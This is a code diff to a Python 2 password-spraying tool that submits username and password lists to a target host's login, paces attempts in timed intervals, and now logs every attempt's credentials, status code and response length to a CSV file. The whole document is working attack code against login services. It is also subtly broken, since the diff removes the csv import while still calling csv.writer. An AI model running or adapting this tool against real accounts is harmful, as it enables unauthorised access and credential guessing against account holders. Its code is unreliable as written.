@@ -2,7 +2,6 @@
 
 import time
 import argparse
-import csv
 import datetime
 import json
 import os
@@ -26,11 +25,11 @@ class Color:
 colors = Color()
 
 def args():
-    parser = argparse.ArgumentParser(description="Python based script for password spraying with selenium and headless chrome", formatter_class=argparse.RawDescriptionHelpFormatter)
+    parser = argparse.ArgumentParser(description="password spraying", formatter_class=argparse.RawDescriptionHelpFormatter)
     parser.add_argument("-p", "--passwords", type=str, dest="passlist", help="filepath of the passwords list", default="./passwords.txt", required=False)
     parser.add_argument("-H", "--host", type=str, dest="host", help="host to password spray", required=True)
     parser.add_argument("-m", "--module", type=str, dest="module", help="module corresponding to target host", required=True)
-    parser.add_argument("-o", "--output", type=str, dest="csvfile", help="name and path of output csv where hits will be logged", required=False)
+    parser.add_argument("-o", "--output", type=str, dest="csvfile", help="name and path of output csv where attempts will be logged", required=True)
     parser.add_argument("-u", "--usernames", type=str, dest="userlist", help="filepath of the usernames list", required=True)
     parser.add_argument("-a", "--attempts", type=int, dest="attempts", help="number of logins submissions per interval (for each user)", required=False)
     parser.add_argument("-i", "--interval", type=int, dest="interval", help="minutes inbetween login intervals", required=False)
@@ -75,6 +74,16 @@ def check_sleep(login_attempts, attempts, interval):
         time.sleep(interval * 60)
         print('')
 
+def print_attempt(username, password, response, csvfile):
+    print('%-27s %-17s %13s %15d' % (username, password, response.status_code, len(response.content)))
+    output = open(csvfile, 'a')
+    output.write('%s,%s,%s,%d\n' % (username, password, response.status_code, len(response.content)))
+    output.close() 
+
+
+def print_header():
+    print('%-27s %-17s %-13s %-15s' % ('Username','Password','Response Code','Response Length'))
+    print('---------------------------------------------------------------------------')
 
 def main():
     users, passwords, host, csvfile, attempts, interval, equal, module, timeout = args()
@@ -95,18 +104,22 @@ def main():
     log_name = 'logs/%s.log' % host
     logging.basicConfig(filename=log_name, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
-    # open the csv file if flag is present
-    if csvfile:
-        output = open(csvfile, 'wb')
-        output_writer = csv.writer(output, delimiter=',')
-        output_writer.writerow(['Username','Password'])
+
+    output = open(csvfile, 'wb')
+    output_writer = csv.writer(output, delimiter=',')
+    output_writer.writerow(['Username','Password','Response Code','Response Length'])
+    output.close()
 
     print('[*] Target Module: %s') % (module)
     print('[*] Spraying URL: %s') % (target.url)
     if attempts:
         print('[*] Interval: Attempting %d logins per user every %d minutes') % (attempts, interval)
-    print('[*] Log: %s') % (log_name)
+    print('[*] Log of event times: %s') % (log_name)
+    print('[*] Log of spray results: %s') % (csvfile)
     print('')
+    raw_input('Press enter to begin:')
+    print('')
+    print_header()
 
     login_attempts = 0
 
@@ -115,17 +128,18 @@ def main():
         print('[*] Spraying with password = username')
         for username in users:
             response = target.login(username, username)
-            success = target.check_success(response)
-            if success:
-                colors.color_print(('\t[+] Hit for: %s') % (username), colors.green)
-                if csvfile:
-                    output_writer.writerow([username, username])
+            #success = target.check_success(response)
+            #if success:
+                #colors.color_print(('\t[+] Hit for: %s') % (username), colors.green)
+                #if csvfile:
+                    #output_writer.writerow([username, username])
+            print_attempt(username, username, response, csvfile)
         login_attempts += 1
 
     # spray using password file
     for password in passwords:
         check_sleep(login_attempts, attempts, interval)
-        print('[*] Spraying with: %s') % (password)
+        #print('[*] Spraying with: %s') % (password)
         for username in users:
             try:
                 response = target.login(username, password)
@@ -138,11 +152,13 @@ def main():
                 print(e)
                 exit()
 
-            success = target.check_success(response)
-            if success:
-                colors.color_print(('\t[+] %s') % (username), colors.green)
-                if csvfile:
-                    output_writer.writerow([username, password])
+            #success = target.check_success(response)
+            #if success:
+                #colors.color_print(('\t[+] %s') % (username), colors.green)
+                #if csvfile:
+                    #output_writer.writerow([username, password])
+            
+            print_attempt(username, password, response, csvfile)
             
             # log the login attempt
             logging.info('Login attempted as %s' % username)
@@ -150,8 +166,7 @@ def main():
         login_attempts += 1
 
     # close files
-    if csvfile:
-        output.close()
+    output.close()
 
 
 if __name__ == '__main__':
